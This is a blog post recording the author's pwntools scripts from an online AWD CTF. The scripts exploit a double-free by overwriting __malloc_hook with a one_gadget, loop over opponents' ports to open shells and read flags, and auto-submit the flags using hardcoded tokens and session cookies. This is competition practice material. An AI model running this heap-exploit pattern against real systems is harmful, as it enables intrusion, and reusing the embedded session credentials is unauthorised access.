@@ -1,0 +1,1261 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Roboto Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="awd,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="木头的小木屋" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="0x0 前言第一次线上awd，交flag是交的真的爽，也算是对awd的流程有所熟悉了。题目不难，但是深感自己写脚本速度还是不够快。">
+<meta name="keywords" content="awd">
+<meta property="og:type" content="article">
+<meta property="og:title" content="awd 通打pwn脚本记录一波">
+<meta property="og:url" content="wood1314.github.io/year/04/26/clew670wv001xff3fwuej5g37/index.html">
+<meta property="og:site_name" content="木头的小木屋">
+<meta property="og:description" content="0x0 前言第一次线上awd，交flag是交的真的爽，也算是对awd的流程有所熟悉了。题目不难，但是深感自己写脚本速度还是不够快。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2020-05-24T01:32:14.307Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="awd 通打pwn脚本记录一波">
+<meta name="twitter:description" content="0x0 前言第一次线上awd，交flag是交的真的爽，也算是对awd的流程有所熟悉了。题目不难，但是深感自己写脚本速度还是不够快。">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":true},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="wood1314.github.io/year/04/26/clew670wv001xff3fwuej5g37/">
+
+
+
+
+
+  <title>awd 通打pwn脚本记录一波 | 木头的小木屋</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">木头的小木屋</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">吃饱混天黑？</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于我
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-list"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br>
+            
+            友情链接
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="wood1314.github.io/year/04/26/clew670wv001xff3fwuej5g37/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wood">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="木头的小木屋">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">awd 通打pwn脚本记录一波</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-26T17:22:38+08:00">
+                2020-04-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/awd/" itemprop="url" rel="index">
+                    <span itemprop="name">awd</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h2><p>第一次线上awd，交flag是交的真的爽，也算是对awd的流程有所熟悉了。题目不难，但是深感自己写脚本速度还是不够快。</p>
+<a id="more"></a>
+
+<h2 id="0x1-第一题"><a href="#0x1-第一题" class="headerlink" title="0x1 第一题"></a>0x1 第一题</h2><p>double_free,然后改就是把free函数给弄没了。。。。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'index&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line">    sh.recvuntil(<span class="string">'size&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(<span class="string">'name&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line">    sh.recvuntil(<span class="string">'Your Choice\n'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'index&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line">    sh.recvuntil(<span class="string">'Your Choice\n'</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'index&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line">    sh.recvuntil(<span class="string">'name&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'5'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'index&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line">    content = sh.recv(<span class="number">6</span>)</span><br><span class="line">   <span class="comment"># log.info(content)</span></span><br><span class="line">    sh.recvuntil(<span class="string">'Your Choice\n'</span>)</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line">ip = <span class="string">"39.100.119.37"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_shell</span><span class="params">(ip, port)</span>:</span></span><br><span class="line">	sh = remote(ip, port)</span><br><span class="line">	sh.recvuntil(<span class="string">'Your Choice\n'</span>)</span><br><span class="line">	add(<span class="number">0</span>,<span class="number">0x100</span>,<span class="string">'a'</span>) <span class="comment">#0</span></span><br><span class="line">	add(<span class="number">1</span>,<span class="number">0x60</span>,<span class="string">'b'</span>) <span class="comment">#1</span></span><br><span class="line">	add(<span class="number">9</span>,<span class="number">0x30</span>,<span class="string">'ss'</span>)</span><br><span class="line">	delete(<span class="number">0</span>)</span><br><span class="line">	libc_base = u64(show(<span class="number">0</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line">	log.success(<span class="string">'libc_base = '</span> + hex(libc_base))</span><br><span class="line">	one_gadget = libc_base + <span class="number">0xf02a4</span></span><br><span class="line">	malloc_hook = libc_base + <span class="number">0x3c4b10</span></span><br><span class="line">	fake_fast = malloc_hook - <span class="number">0x13</span></span><br><span class="line">	add(<span class="number">2</span>,<span class="number">0x60</span>,<span class="string">'c'</span>)</span><br><span class="line">	add(<span class="number">3</span>,<span class="number">0x60</span>,<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">	delete(<span class="number">1</span>)</span><br><span class="line">	delete(<span class="number">2</span>)</span><br><span class="line">	delete(<span class="number">1</span>)</span><br><span class="line">	delete(<span class="number">9</span>)</span><br><span class="line">	add(<span class="number">4</span>,<span class="number">0x60</span>,p64(fake_fast))</span><br><span class="line">	add(<span class="number">5</span>,<span class="number">0x60</span>,<span class="string">'z'</span>)</span><br><span class="line">	add(<span class="number">6</span>,<span class="number">0x60</span>,<span class="string">'ss'</span>)</span><br><span class="line">	add(<span class="number">7</span>,<span class="number">0x60</span>,<span class="string">'a'</span> * <span class="number">0x3</span> + p64(one_gadget))</span><br><span class="line"></span><br><span class="line">	sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">	sh.recvuntil(<span class="string">'index&gt;&gt; '</span>)</span><br><span class="line">	sh.sendline(str(<span class="number">1</span>))</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> sh</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(ip, port)</span>:</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		r = get_shell(ip, port)</span><br><span class="line">		r.sendline(<span class="string">"cat flag\n"</span>)</span><br><span class="line">		<span class="keyword">print</span> r.recv(<span class="number">100</span>)</span><br><span class="line">		r.close()</span><br><span class="line">	<span class="keyword">except</span> KeyError <span class="keyword">as</span> e:</span><br><span class="line">		print(<span class="string">'KeyError'</span>)</span><br><span class="line">	<span class="keyword">except</span> IndexError <span class="keyword">as</span> e:</span><br><span class="line">		print(<span class="string">'IndexError'</span>)</span><br><span class="line">	<span class="keyword">except</span> TypeError <span class="keyword">as</span> e:</span><br><span class="line">		print(<span class="string">'TypeError'</span>)</span><br><span class="line">	<span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">		print(<span class="string">'ValueError'</span>)</span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		print(<span class="string">'Exception'</span>)</span><br><span class="line"></span><br><span class="line">port = <span class="number">41080</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">	get_flag(ip, port + i * <span class="number">100</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x2-第二题"><a href="#0x2-第二题" class="headerlink" title="0x2 第二题"></a>0x2 第二题</h2><p>还是个double_free,同样把free给改没了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">token = <span class="string">"7hQvn3AnHrtjaFmFN2MxztbCM4hGRQECZKEvJzu2dtSfU"</span></span><br><span class="line">url = <span class="string">"http://10.66.20.15/api/v1/jad/web/submit_flag/?event_id=2"</span></span><br><span class="line"></span><br><span class="line">ips=[]</span><br><span class="line"></span><br><span class="line">context.timeout = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'index&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line">    sh.recvuntil(<span class="string">'size&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(<span class="string">'name&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line">    sh.recvuntil(<span class="string">'Your Choice\n'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'index&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line">    sh.recvuntil(<span class="string">'Your Choice\n'</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'index&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line">    sh.recvuntil(<span class="string">'name&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'5'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'index&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line">    content = sh.recv(<span class="number">6</span>)</span><br><span class="line">   <span class="comment"># log.info(content)</span></span><br><span class="line">    sh.recvuntil(<span class="string">'Your Choice\n'</span>)</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>,<span class="number">30</span>):</span><br><span class="line">	ips.append(<span class="string">"4"</span> + str(i + <span class="number">2</span>).rjust(<span class="number">2</span>,<span class="string">'0'</span>) + <span class="string">"80"</span>)</span><br><span class="line"><span class="comment"># print ips</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_shell</span><span class="params">(ip)</span>:</span></span><br><span class="line">	<span class="keyword">global</span> sh</span><br><span class="line">	</span><br><span class="line">	sh = remote(<span class="string">'39.100.119.37'</span>, int(ip,<span class="number">10</span>))</span><br><span class="line">	sh.recvuntil(<span class="string">'Your Choice\n'</span>)</span><br><span class="line">	add(<span class="number">0</span>,<span class="number">0x100</span>,<span class="string">'a'</span>) <span class="comment">#0</span></span><br><span class="line">	add(<span class="number">1</span>,<span class="number">0x60</span>,<span class="string">'b'</span>) <span class="comment">#1</span></span><br><span class="line">	add(<span class="number">9</span>,<span class="number">0x30</span>,<span class="string">'ss'</span>)</span><br><span class="line">	delete(<span class="number">0</span>)</span><br><span class="line">	libc_base = u64(show(<span class="number">0</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line">	log.success(<span class="string">'libc_base = '</span> + hex(libc_base))</span><br><span class="line">	one_gadget = libc_base + <span class="number">0xf02a4</span></span><br><span class="line">	malloc_hook = libc_base + <span class="number">0x3c4b10</span></span><br><span class="line">	fake_fast = malloc_hook - <span class="number">0x13</span></span><br><span class="line">	add(<span class="number">2</span>,<span class="number">0x60</span>,<span class="string">'c'</span>)</span><br><span class="line">	add(<span class="number">3</span>,<span class="number">0x60</span>,<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">	delete(<span class="number">1</span>)</span><br><span class="line">	delete(<span class="number">2</span>)</span><br><span class="line">	delete(<span class="number">1</span>)</span><br><span class="line">	delete(<span class="number">9</span>)</span><br><span class="line">	add(<span class="number">4</span>,<span class="number">0x60</span>,p64(fake_fast))</span><br><span class="line">	add(<span class="number">5</span>,<span class="number">0x60</span>,<span class="string">'z'</span>)</span><br><span class="line">	add(<span class="number">6</span>,<span class="number">0x60</span>,<span class="string">'ss'</span>)</span><br><span class="line">	add(<span class="number">7</span>,<span class="number">0x60</span>,<span class="string">'a'</span> * <span class="number">0x3</span> + p64(one_gadget))</span><br><span class="line">	sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">	sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">	<span class="keyword">return</span> sh</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(ip)</span>:</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		sh = get_shell(ip)</span><br><span class="line">		<span class="comment">#sh.interactive()</span></span><br><span class="line">		sh.sendline(<span class="string">'cat ?l?g'</span>)</span><br><span class="line">		sleep(<span class="number">0.5</span>)</span><br><span class="line">		sh.sendline(<span class="string">'cat flag'</span>)</span><br><span class="line">		flag = sh.recvall(timeout= <span class="number">1</span>)</span><br><span class="line">		log.success(flag)</span><br><span class="line">		sh.close()</span><br><span class="line">	<span class="keyword">except</span> KeyError <span class="keyword">as</span> e:</span><br><span class="line">		print(<span class="string">'KeyError'</span>)</span><br><span class="line">	<span class="keyword">except</span> IndexError <span class="keyword">as</span> e:</span><br><span class="line">		print(<span class="string">'IndexError'</span>)</span><br><span class="line">	<span class="keyword">except</span> TypeError <span class="keyword">as</span> e:</span><br><span class="line">		print(<span class="string">'TypeError'</span>)</span><br><span class="line">	<span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">		print(<span class="string">'ValueError'</span>)</span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		print(<span class="string">'Exception'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">	<span class="comment"># if ip[7:9] == "16" or ip[7:9] == "17" or ip[7:8] == "8" or ip[7:8] == "6":</span></span><br><span class="line">	<span class="comment"># 	continue</span></span><br><span class="line"></span><br><span class="line">	get_flag(ip)</span><br></pre></td></tr></table></figure>
+
+<h2 id="自动提交脚本"><a href="#自动提交脚本" class="headerlink" title="自动提交脚本"></a>自动提交脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tjflag1</span><span class="params">(flag)</span>:</span></span><br><span class="line"></span><br><span class="line">    url=<span class="string">"http://39.100.119.37:8080/api/v1/challenges/attempt"</span></span><br><span class="line">    <span class="comment">#data=&#123;"challenge_id":2,"submission":""+flag+""&#125;</span></span><br><span class="line">    data=<span class="string">'&#123;"challenge_id":2,"submission":"'</span>+flag+<span class="string">'"&#125;'</span></span><br><span class="line">    h = &#123;</span><br><span class="line"><span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"</span>,</span><br><span class="line"><span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>,</span><br><span class="line"><span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3"</span>,</span><br><span class="line"><span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>,</span><br><span class="line"><span class="string">"CSRF-Token"</span>:<span class="string">"e9817606c5e5373499bd7e43b64c045b60a276b839b340c4f4a37c2eb27f4e8a"</span>,</span><br><span class="line"><span class="string">"Connection"</span>: <span class="string">"keep-alive"</span>,</span><br><span class="line"><span class="string">"Content-Type"</span>: <span class="string">"application/json"</span></span><br><span class="line">&#125;</span><br><span class="line">    cookies=&#123;<span class="string">"session"</span>:<span class="string">"2deefa03-cda6-41fc-be25-a986067c7048"</span>,<span class="string">"PHPSESSID"</span>:<span class="string">"jnr3quolg5o2ohlifbdld6bku5"</span>&#125;</span><br><span class="line">    req=requests.post(url=url,data=data,cookies=cookies,headers=h)</span><br><span class="line">    print(req.text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ftjflag1</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"./web2.txt"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> f:</span><br><span class="line">            print(a.strip())</span><br><span class="line">            tjflag1(a.strip())</span><br><span class="line">ftjflag1()</span><br></pre></td></tr></table></figure>
+
+<h3 id="整理flag的正则"><a href="#整理flag的正则" class="headerlink" title="整理flag的正则"></a>整理flag的正则</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag=re.findall(r&apos;flag&#123;[a-zA-Z0-9\-]*&#125;&apos;, data)[0]</span><br><span class="line">            flag_file.write(flag+&quot;\n&quot;)</span><br></pre></td></tr></table></figure>
+
